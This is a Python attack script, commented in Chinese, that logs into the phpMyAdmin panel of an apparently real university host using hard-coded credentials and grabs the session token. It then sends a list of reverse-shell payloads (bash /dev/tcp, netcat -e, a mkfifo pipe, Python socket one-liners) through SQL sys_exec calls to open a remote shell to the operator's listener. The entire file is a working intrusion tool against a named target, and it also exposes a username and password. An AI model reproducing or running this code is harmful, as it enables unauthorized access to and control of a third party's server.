#!/usr/bin/env python3
import requests
import re
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[*] 执行反向shell...")

# 获取监听IP（从参数或环境变量）
LHOST = sys.argv[1] if len(sys.argv) > 1 else "YOUR_IP"
LPORT = sys.argv[2] if len(sys.argv) > 2 else "4444"

if LHOST == "YOUR_IP":
    print("[!] 请提供监听IP和端口: python3 reverse_shell.py <IP> <PORT>")
    print("[!] 或先在你的机器上运行: nc -lvp 4444")
    LHOST = input("输入监听IP: ").strip()
    LPORT = input("输入监听端口 (默认4444): ").strip() or "4444"

print(f"[*] 目标: {LHOST}:{LPORT}")
print("[*] 请确保你的监听器已启动: nc -lvp {LPORT}")

# 多种反向shell方式
reverse_shells = [
    f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
    f"/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"nc -e /bin/bash {LHOST} {LPORT}",
    f"nc -e /bin/sh {LHOST} {LPORT}",
    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
    f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
]

for i, shell_cmd in enumerate(reverse_shells, 1):
    print(f"\n[*] 尝试方式{i}: {shell_cmd[:60]}...")
    sql = f"SELECT sys_exec('{shell_cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    try:
        resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False, timeout=2)
        print(f"[*] 已发送，检查监听器...")
        # 给连接一些时间
        import time
        time.sleep(2)
    except:
        pass

print("\n[+] 反向shell尝试完成!")
print("[*] 如果连接成功，你应该在监听器中看到shell")
